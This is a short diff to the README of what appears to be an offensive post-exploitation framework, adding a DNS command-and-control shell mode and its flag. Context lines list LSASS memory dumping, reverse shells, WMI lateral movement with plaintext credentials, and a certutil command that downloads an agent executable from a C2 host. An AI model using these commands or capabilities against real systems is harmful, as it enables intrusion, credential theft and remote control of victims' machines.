@@ -43,6 +43,7 @@ vulnerabilities.
 * weaponization of run-as-user windows api function. [Video](https://youtu.be/oe-BFZpV8nw)
 * local network scanning and shares enumeration.
 * lsass memory dummping technique (plugin).
+* DNS C2C interactive shellmode 
 
 ### installation 
 
@@ -95,6 +96,7 @@ certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.ex
 -r --spawn a reverse shell with specific account.
 -lr --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )
 -nds --network discovery and share enumeration
+-dns --establish interactive dns C2C shell
 -cmd --transfer commands via HTTP Shell
 -interactive --starting interactive mode (eg : loading plugins ..etc)
 -username --identity authentication for specific attack modules.
